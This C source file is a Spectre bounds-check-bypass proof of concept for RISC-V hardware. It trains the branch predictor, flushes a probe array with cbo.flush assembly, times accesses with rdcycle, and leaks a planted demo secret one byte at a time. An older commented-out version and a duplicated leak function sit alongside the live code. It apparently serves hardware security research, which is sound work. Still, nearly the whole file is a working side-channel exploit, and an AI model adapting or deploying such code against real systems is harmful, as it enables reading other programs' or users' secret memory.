// //#define C910 

// #include <stdio.h>
// #include <string.h>
// #include <time.h>
// #include <assert.h>
// #include <stdint.h>
// #include <stdlib.h>
// #include "../rlibsc.h" 

// #define BENIGN_SIZE 50

// #define SECRET "Spectre_on_RISC-V_hardware!"
// #define SECRET_SIZE (sizeof(SECRET) - 1)
// #define CACHE_HIT_THRESHOLD 95

// #define PAGE_SIZE 2048
// #define PROBE_SIZE (256 * PAGE_SIZE)
// #define CACHE_LINE_SIZE 64

// int buf_size = BENIGN_SIZE;
// uint8_t cache_barrier1[512] = {0};
// // init with values as this prevents nasty reordering
// char victim[BENIGN_SIZE] = {1,2,3,4,5};
// uint8_t cache_barrier2[512] = {0};
// char probe_array[PROBE_SIZE];
// uint8_t cache_barrier3[512];
// char secret_data[SECRET_SIZE];

// static inline void flush_new(void* addr) {
// // ////////:Test this 
// //   asm volatile("cbo.flush 0(%0)\n\t"
// //     : : "r"(addr) :"memory");
// //////Correctly working MK edits
//   asm volatile("xor a7, a7, a7\n"
//                "add a7, a7, %0\n"
//                "cbo.flush 0(%0)\n\t"
//   : : "r"(addr) : "a7","memory");
// }

// void init() {
//   srandom(time(NULL));
//   for (int i = 0; i < PROBE_SIZE; i++) {
//     probe_array[i] = (char) random();
//   }
//   strncpy(victim, "THIS_IS_BENIGN_CONTENT!", BENIGN_SIZE);
//   strncpy(secret_data, SECRET, SECRET_SIZE);

//   // prevent optimizing of cache barriers
//   printf("%s", cache_barrier1);
//   printf("%s", cache_barrier2);
//   printf("%s", cache_barrier3);
// }

// char read_content(int idx) {
//   if (idx >= 0 && idx < buf_size) {
//     int tmp = victim[idx];
//     return probe_array[tmp << 11];
//   } else
//     return 0;
// }


// int leak_byte(int offset, char* leak) {
//   // assert that we actually need to access out-of-bound that
//   //printf("got offset: %d\n", offset);
//   assert(offset > 0 && offset > buf_size);
//   int junk = 1337;

//   int hits[256] = {0};

//   for (int j = 0; j < 150; j++) {
//     // train by accessing in-bound
//     for (int i = 50; i > 0; i--)  {
//       junk ^= read_content(0);
//     }

//     // flush probe array from cache
//     for (int i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE) {
//       flush_new(probe_array + i);
//     }


//     fence();
//     int x;
//     int training_x = random() % BENIGN_SIZE;
//     int malicious_x = offset;
//     // access pattern: 5 training runs and 1 out-of-bound access
//     for (int i = 0; i < 1; i++) {
//       flush_new(&buf_size);
//       fence();
//       // bit magic to prevent using a conditional jump
//       x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
//       x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
//       x = training_x ^ (x & (malicious_x ^ training_x));
//       junk ^= read_content(x);
//     }

//     unsigned int junk2 = 0;
//     unsigned long long int before, after;
//     unsigned long long int elapsed[256] = {0};
//     int idx;
//     for (int i = 0; i < 256; i++) {
//       idx = (i * 167 + 13) & 255;
//       before = rdcycle(&junk2);
//       junk += probe_array[idx * PAGE_SIZE];
//       after = rdcycle(&junk2);
//       elapsed[idx] = after - before;
//       if (elapsed[idx] < CACHE_HIT_THRESHOLD && idx != training_x) {
//         hits[idx]++;
//         //printf("got hit for %c\n", idx);
//       }
//     }
//   }

//   char best_char = 0;
//   int best_count = 0;
//   for (int i = 30; i < 127; i++) {
//     if (hits[i] > best_count) {
//       best_char = i;
//       best_count = hits[i];
//     }
//   }
//   printf("i: 0x%x  \t c: %4c  \t hit-count: %5d\n", best_char,
//       best_char, best_count);
//   *leak = best_char;
//   return junk;
// }

// #define NO_BYTES_TO_LEAK SECRET_SIZE

// int main() {
//   init();
//   int junk = 0;
//   char leaked[NO_BYTES_TO_LEAK + 1] = {0};
//   for (int i = 0; i < NO_BYTES_TO_LEAK; i++) {
//     char curr_leak;
//     junk ^= leak_byte(secret_data - victim + i, &curr_leak);
//     leaked[i] = curr_leak;
//     printf("curr leak: %s\n", leaked);
//   }
//   return junk;
// }






//#define C910 

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <assert.h>
#include <stdint.h>
#include <stdlib.h>
#include "../rlibsc.h" 

#define BENIGN_SIZE 50

#define SECRET "Spectre_on_RISC-V_hardware!"
#define SECRET_SIZE (sizeof(SECRET) - 1)
#define CACHE_HIT_THRESHOLD 91

#define PAGE_SIZE 2048
#define PROBE_SIZE (256 * PAGE_SIZE)
#define CACHE_LINE_SIZE 64

int buf_size = BENIGN_SIZE;
uint8_t cache_barrier1[512] = {0};
// init with values as this prevents nasty reordering
char victim[BENIGN_SIZE] = {1,2,3,4,5};
uint8_t cache_barrier2[512] = {0};
char probe_array[PROBE_SIZE];
uint8_t cache_barrier3[512];
char secret_data[SECRET_SIZE];
static inline void flush_new(void* addr) {

  asm volatile("xor a7, a7, a7\n"
               "add a7, a7, %0\n"
               "cbo.flush 0(%0)\n\t"
  : : "r"(addr) : "a7","memory");
}

void init() {
  srandom(time(NULL));
  for (int i = 0; i < PROBE_SIZE; i++) {
    probe_array[i] = (char) random();
  }
  strncpy(victim, "THIS_IS_BENIGN_CONTENT!", BENIGN_SIZE);
  strncpy(secret_data, SECRET, SECRET_SIZE);

  // prevent optimizing of cache barriers
  printf("%s", cache_barrier1);
  printf("%s", cache_barrier2);
  printf("%s", cache_barrier3);
}

char read_content(int idx) {
  if (idx >= 0 && idx < buf_size) {
    int tmp = victim[idx];
    return probe_array[tmp << 11];
  } else
    return 0;
}

int leak_byte(int offset, char* leak) {
  assert(offset > 0 && offset > buf_size);
  int junk = 1337;

  int hits[256] = {0};

  for (int j = 0; j < 250; j++) {
    for (int i = 50; i > 0; i--) {
      junk ^= read_content(0);
    }

    for (int i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE) {
      flush_new(probe_array + i);
    }

    fence();
    int x;
    int training_x = random() % BENIGN_SIZE;
    int malicious_x = offset;
    for (int i = 0; i < 1; i++) {
      flush_new(&buf_size);
      fence();
      x = ((j % 6) - 1) & ~0xFFFF;
      x = (x | (x >> 16));
      x = training_x ^ (x & (malicious_x ^ training_x));
      junk ^= read_content(x);
    }

    unsigned int junk2 = 0;
    unsigned long long int before, after;
    unsigned long long int elapsed[256] = {0};
    int idx;
    for (int i = 0; i < 256; i++) {
      idx = (i * 167 + 13) & 255;
      before = rdcycle(&junk2);
      junk += probe_array[idx * PAGE_SIZE];
      after = rdcycle(&junk2);
      elapsed[idx] = after - before;
      if (elapsed[idx] < CACHE_HIT_THRESHOLD && idx != training_x) {
        hits[idx]++;
      }
    }
  }

  // Find top 3 guesses
  int top_hits[3] = {0};
  char top_chars[3] = {0};

  for (int i = 30; i < 127; i++) {
    for (int k = 0; k < 3; k++) {
      if (hits[i] > top_hits[k]) {
        // Shift lower ranked results down
        for (int l = 2; l > k; l--) {
          top_hits[l] = top_hits[l-1];
          top_chars[l] = top_chars[l-1];
        }
        top_hits[k] = hits[i];
        top_chars[k] = i;
        break;
      }
    }
  }

  printf("Top guesses:\n");
  for (int i = 0; i < 3; i++) {
    printf("Rank %d: i: 0x%x \t c: %4c \t hit-count: %5d\n",
      i+1, top_chars[i], top_chars[i], top_hits[i]);
  }

  *leak = top_chars[0];
  return junk;
}

#define NO_BYTES_TO_LEAK SECRET_SIZE

int main() {
  init();
  int junk = 0;
  char leaked[NO_BYTES_TO_LEAK + 1] = {0};
  for (int i = 0; i < NO_BYTES_TO_LEAK; i++) {
    char curr_leak;
    junk ^= leak_byte(secret_data - victim + i, &curr_leak);
    leaked[i] = curr_leak;
    printf("curr leak: %s\n", leaked);
  }
  return junk;
}



// int leak_byte(int offset, char* leak) {
//   // assert that we actually need to access out-of-bound that
//   //printf("got offset: %d\n", offset);
//   assert(offset > 0 && offset > buf_size);
//   int junk = 1337;

//   int hits[256] = {0};

//   for (int j = 0; j < 150; j++) {
//     // train by accessing in-bound
//     for (int i = 50; i > 0; i--)  {
//       junk ^= read_content(0);
//     }

//     // flush probe array from cache
//     for (int i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE) {
//       flush_new(probe_array + i);
//     }


//     fence();
//     int x;
//     int training_x = random() % BENIGN_SIZE;
//     int malicious_x = offset;
//     // access pattern: 5 training runs and 1 out-of-bound access
//     for (int i = 0; i < 1; i++) {
//       flush_new(&buf_size);
//       fence();
//       // bit magic to prevent using a conditional jump
//       x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
//       x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
//       x = training_x ^ (x & (malicious_x ^ training_x));
//       junk ^= read_content(x);
//     }

//     unsigned int junk2 = 0;
//     unsigned long long int before, after;
//     unsigned long long int elapsed[256] = {0};
//     int idx;
//     for (int i = 0; i < 256; i++) {
//       idx = (i * 167 + 13) & 255;
//       before = rdcycle(&junk2);
//       junk += probe_array[idx * PAGE_SIZE];
//       after = rdcycle(&junk2);
//       elapsed[idx] = after - before;
//       if (elapsed[idx] < CACHE_HIT_THRESHOLD && idx != training_x) {
//         hits[idx]++;
//         //printf("got hit for %c\n", idx);
//       }
//     }
//   }

//   char best_char = 0;
//   int best_count = 0;
//   for (int i = 30; i < 127; i++) {
//     if (hits[i] > best_count) {
//       best_char = i;
//       best_count = hits[i];
//     }
//   }
//   printf("i: 0x%x  \t c: %4c  \t hit-count: %5d\n", best_char,
//       best_char, best_count);
//   *leak = best_char;
//   return junk;
// }